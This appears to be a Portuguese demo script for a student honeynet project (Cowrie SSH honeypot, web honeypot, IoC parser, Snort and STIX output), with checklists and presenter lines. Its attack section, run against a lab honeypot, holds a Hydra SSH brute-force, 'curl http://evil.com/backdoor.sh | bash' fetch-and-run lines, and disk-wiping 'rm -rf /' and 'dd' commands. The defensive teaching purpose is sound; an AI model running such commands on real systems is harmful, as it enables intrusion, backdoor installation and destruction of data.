## 📋 PRÉ-REQUISITOS (10 min antes)

### Ubuntu:
```bash
# 1. Verificar Cowrie configurado para UserDB mode
cd ~/cowrie
grep "^auth_class" etc/cowrie.cfg
# Deve mostrar: auth_class = UserDB

# Se mostrar AuthRandom, corrigir:
nano etc/cowrie.cfg
# Mudar para: auth_class = UserDB
# Comentar: #auth_class = AuthRandom

# 2. Verificar userdb.txt existe
cat etc/userdb.txt | grep root
# Deve mostrar: root:x:!root

# 3. Reiniciar Cowrie
cowrie restart
sleep 5

# 4. Verificar status
cowrie status
sudo netstat -tulpn | grep 2222

# 5. Verificar BD
cd ~/Documentos/Mestrado/SR_Proj
sqlite3 cowrie_iocs.db "SELECT COUNT(*) FROM iocs;"

# 6. Verificar logs JSON
ls -lh /var/log/cowrie/cowrie.json

# 7. Anotar IP
hostname -I

# 8. WebHP parado (iniciar durante demo)
pkill -f web_honeypot.py 2>/dev/null
```

### Parrot VM:
```bash
# 1. Conectividade
ping -c 2 192.168.1.69
nc -zv 192.168.1.69 2222

# 2. Criar wordlist otimizada
cat > ~/passwords.txt << 'EOF'
password
admin
letmein
root
123456
qwerty
EOF

# 3. Testar SSH manual (deve conectar)
ssh -p 2222 root@192.168.1.69
# password: root
# Se conectar → tudo OK!
exit

# 4. Limpar terminal
clear
```

---

## 🎬 DEMONSTRAÇÃO

### **PARTE 1: Introdução + Arquitetura (2 min)**

**Falar:**
> "Implementei uma HoneyNet multi-protocolo que captura ataques reais em SSH, Telnet e HTTP, classifica automaticamente as ameaças em 4 níveis de severidade e gera regras de deteção para IDS."

**Componentes:**
1. **Cowrie** - Honeypot SSH/Telnet (modo interativo)
2. **WebHP** - Honeypot HTTP (scanners web)
3. **Parser + Classifier** - Extração e classificação automática de IoCs
4. **SQLite Database** - Armazenamento centralizado
5. **Snort Generator** - Conversão para regras IDS
6. **STIX Exporter** - Standard threat intelligence (SIEM)
7. **Streamlit Dashboard** - Visualização interativa

**Fluxo:**
```
Ataque → Honeypot → Logs → Parser → IoCs (BD) → Outputs
                                         ↓
                              ┌──────────┼──────────┐
                              ↓          ↓          ↓
                         Snort Rules  STIX 2.1  Dashboard
```

---

### **PARTE 3: Ataque SSH da VM (4 min)** 🔥

**IMPORTANTE:** Explicar modo de autenticação antes do ataque!

**Falar antes de atacar:**
> "O Cowrie está configurado em modo **UserDB** - aceita propositadamente credenciais fracas comuns (`root:root`, `admin:admin`) para capturar sessões completas dos atacantes.
>
> Isto é uma técnica chamada **'honey credentials'** (credenciais-isca). Não é falha de segurança - é intencional! Permite:
> - ✅ Capturar sessões interativas completas
> - ✅ Estudar TTPs (Tactics, Techniques, Procedures)
> - ✅ Coletar malware se houver download
> - ✅ Entender objetivos do atacante
>
> O atacante pensa que entrou num servidor real, mas está num ambiente controlado. Cada comando é registado!"

#### Ubuntu - Terminal Logs (esquerda):
```bash
cd ~/cowrie

tail -f /var/log/cowrie/cowrie.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        data = json.loads(line)
        event = data.get('eventid', '')
        if 'login' in event:
            user = data.get('username', 'N/A')
            pwd = data.get('password', 'N/A')
            ip = data.get('src_ip', 'N/A')
            status = 'SUCCESS' if 'success' in event else 'FAILED '
            print(f'[{status}] {ip:15s} -> {user:10s}:{pwd:15s}')
        elif 'command' in event:
            cmd = data.get('input', 'N/A')[:50]
            ip = data.get('src_ip', 'N/A')
            print(f'[COMMAND] {ip:15s} -> {cmd}')
    except:
        pass
"
```

#### Parrot - Terminal Ataque (direita):
```bash
TARGET="192.168.1.69"
PORT="2222"

# Hydra brute force
hydra -l root -P ~/passwords.txt -t 4 -s $PORT -V ssh://$TARGET
```

**Falar durante ataque:**
> "Vejam no terminal Ubuntu - cada tentativa está a ser capturada:
> - `[FAILED]` para passwords erradas
> - `[SUCCESS]` quando encontra `root:root`
> 
> O Hydra testou 6 passwords e encontrou a correta. Mas atenção - o atacante não entrou no MEU sistema real, entrou no honeypot!"

**Quando aparecer `[SUCCESS]`:**
> "Aqui! A 'ratoeira' foi ativada. Agora vamos ver o que o atacante faz quando pensa que tem acesso root..."

#### Sessão interativa (Parrot):
```bash
ssh -p 2222 root@192.168.1.69
# password: root

# Comandos de reconhecimento
whoami
hostname
uname -a
id

# Enumeração
cat /etc/passwd
ls -la /root
ps aux

# Tentativa de persistência/malware
wget http://malicious.com/payload.sh
curl http://evil.com/backdoor.sh | bash

# Tentativa destrutiva
rm -rf /
dd if=/dev/zero of=/dev/sda

exit
```

**Falar durante comandos (apontar terminal Ubuntu):**
> "Observem os comandos capturados:
> 
> **Reconhecimento:** `whoami`, `uname`, `id` - o atacante quer saber onde está.
> 
> **Enumeração:** `cat /etc/passwd` - procura outros utilizadores para atacar.
> 
> **Persistência:** `wget malware.sh`, `curl backdoor` - tentativa de instalar backdoor.
> 
> **Impacto:** `rm -rf /`, `dd if=/dev/zero` - comandos **DESTRUTIVOS**! Se fosse servidor real, seria desastre. Mas é honeypot - tudo capturado e classificado como CRITICAL!"

---

### **PARTE 4: Análise Pós-Ataque (2 min)**

```bash
cd ~/Documentos/Mestrado/SR_Proj

# Parser extrai IoCs dos logs
python3 parser/cowrie_parser_and_snortgen.py \
  --log /var/log/cowrie/cowrie.json \
  --db cowrie_iocs.db

# Ver novos IoCs capturados (últimos 5 min)
sqlite3 cowrie_iocs.db "
SELECT type, value, severity, count FROM iocs 
WHERE datetime(last_seen) > datetime('now', '-5 minutes')
ORDER BY last_seen DESC LIMIT 15;
"
```

**Falar:**
> "O parser analisou os logs e extraiu automaticamente:
> - **IP da VM Parrot** → HIGH severity
> - **Username 'root'** → HIGH (conta privilegiada)
> - **Password 'root'** → HIGH (credencial fraca)
> - **Comandos destrutivos** → CRITICAL (`rm -rf /`, `dd`)
> - **URLs de malware** → HIGH/CRITICAL
> - **Técnicas ATT&CK** identificadas
> 
> Tudo classificado e pronto para gerar regras de proteção!"

---

### **CONCLUSÃO (1 min)**

```bash
cd ~/Documentos/Mestrado/SR_Proj

# Estatísticas finais
sqlite3 cowrie_iocs.db "
SELECT 
  (SELECT COUNT(*) FROM iocs) as total_iocs,
  (SELECT COUNT(*) FROM iocs WHERE severity='CRITICAL') as critical,
  (SELECT COUNT(*) FROM iocs WHERE severity='HIGH') as high,
  (SELECT COUNT(*) FROM iocs WHERE source='cowrie') as from_ssh,
  (SELECT COUNT(*) FROM iocs WHERE source='webhp') as from_http;
"

echo -e "\nSnort Rules:"
grep -c '^alert' snort/cowrie_autogen.rules

echo -e "\nExports:"
ls -1 exports/ | tail -3
```

**Falar:**
> "**Resumo do sistema:**
> 
> ✅ **Multi-protocolo:** SSH (Cowrie) + HTTP (WebHP)
> ✅ **Honey credentials:** Sessões interativas para captura de TTPs
> ✅ **X IoCs capturados** (Y CRITICAL, Z HIGH)
> ✅ **W regras Snort** geradas automaticamente
> ✅ **Exportação STIX 2.1** para SIEM (Splunk, QRadar, MISP)
> ✅ **Dashboard interativo** Streamlit
> ✅ **Production-ready** para SOC operacional
> 
> O sistema demonstra um **ciclo completo de threat intelligence**:
> Captura → Análise → Classificação → Proteção → Partilha
> 
> Obrigado!"

---

## 📋 CHECKLIST PRÉ-DEMO (CRÍTICO!)

```bash
# ========================================
# UBUNTU - VERIFICAR TUDO!
# ========================================

# 1. Cowrie em UserDB mode (ESSENCIAL!)
cd ~/cowrie
grep "^auth_class" etc/cowrie.cfg
# ✓ Deve mostrar: auth_class = UserDB
# ✗ Se mostrar AuthRandom → CORRIGIR!

# 2. UserDB tem credenciais
cat etc/userdb.txt | grep "root:x:!root"
# ✓ Deve aparecer

# 3. Cowrie a correr
cowrie status
# ✓ Deve mostrar: running

# 4. Porta 2222 aberta
sudo netstat -tulpn | grep 2222
# ✓ Deve mostrar: 0.0.0.0:2222 LISTEN

# 5. Logs JSON existem
ls -lh /var/log/cowrie/cowrie.json
# ✓ Deve ter > 50KB

# 6. BD tem dados
cd ~/Documentos/Mestrado/SR_Proj
sqlite3 cowrie_iocs.db "SELECT COUNT(*) FROM iocs;"
# ✓ Deve ter > 50 IoCs

# 7. Regras Snort existem
ls -lh snort/cowrie_autogen.rules
# ✓ Deve ter > 10KB

# 8. Dashboard testado
streamlit run dashboard/dashboard.py &
sleep 5
# ✓ Abrir http://localhost:8501 no browser
pkill -f streamlit

# 9. IP anotado
hostname -I
# ✓ Anotar: __________

# ========================================
# PARROT VM - VERIFICAR TUDO!
# ========================================

# 1. Ping ao Ubuntu
ping -c 2 192.168.1.69
# ✓ Deve responder

# 2. Porta 2222 acessível
nc -zv 192.168.1.69 2222
# ✓ Deve mostrar: succeeded

# 3. SSH funciona (TESTE CRÍTICO!)
ssh -p 2222 root@192.168.1.69
# password: root
# ✓ DEVE CONECTAR!
whoami
# ✓ Deve mostrar: root
exit

# 4. Passwords.txt existe
cat ~/passwords.txt | wc -l
# ✓ Deve ter 6 linhas

# 5. Hydra instalado
which hydra
# ✓ Deve mostrar: /usr/bin/hydra

# ========================================
# SE TESTE SSH FALHAR:
# ========================================

# Ubuntu - verificar config
cd ~/cowrie
grep "^auth_class" etc/cowrie.cfg
# Se mostrar AuthRandom:
nano etc/cowrie.cfg
# Mudar para: auth_class = UserDB
cowrie restart
sleep 5

# Parrot - testar novamente
ssh -p 2222 root@192.168.1.69
# Deve conectar agora!
```

---

## 🎯 PONTOS-CHAVE PARA ENFATIZAR NA DEMO

### **1. Modo UserDB (Honey Credentials)**
> "Não é falha - é estratégia! Aceitar credenciais fracas propositadamente permite capturar comportamento pós-exploração."

### **2. Sessão Interativa vs Rejeição**
> "Diferença entre bloquear ataque (boring) vs estudar atacante (threat intelligence rica)."

### **3. Comandos Destrutivos**
> "Em servidor real, `rm -rf /` seria catastrófico. No honeypot, é apenas mais um IoC classificado como CRITICAL."

### **4. Ciclo Completo**
> "Captura → Parser → Classificação → Regras IDS → SIEM. Tudo automatizado, zero intervenção manual."

### **5. Production-Ready**
> "Sistema operacional 24/7. SOC pode integrar hoje e começar a receber threat intelligence em tempo real."